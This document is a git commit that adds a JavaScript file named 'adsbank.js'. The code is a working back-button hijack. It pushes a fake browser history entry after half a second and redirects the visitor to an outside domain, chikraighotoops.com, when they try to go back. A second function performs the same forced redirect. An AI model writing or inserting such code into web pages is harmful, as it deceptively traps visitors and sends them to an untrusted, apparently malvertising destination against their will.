6f7437976f6c71dcdf3a6463e030fcc47f624565
bigetijazz13 <bigetijazz13@gmail.com>
2024-11-21 10:52:07 -0800

    Create adsbank.js

---
+++ adsbank.js
@@ -0,0 +1,12 @@
+
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://chikraighotoops.com/4/8500565";
+    }
+    function goon(){
+        location.href="https://chikraighotoops.com/4/8500565";
+    }
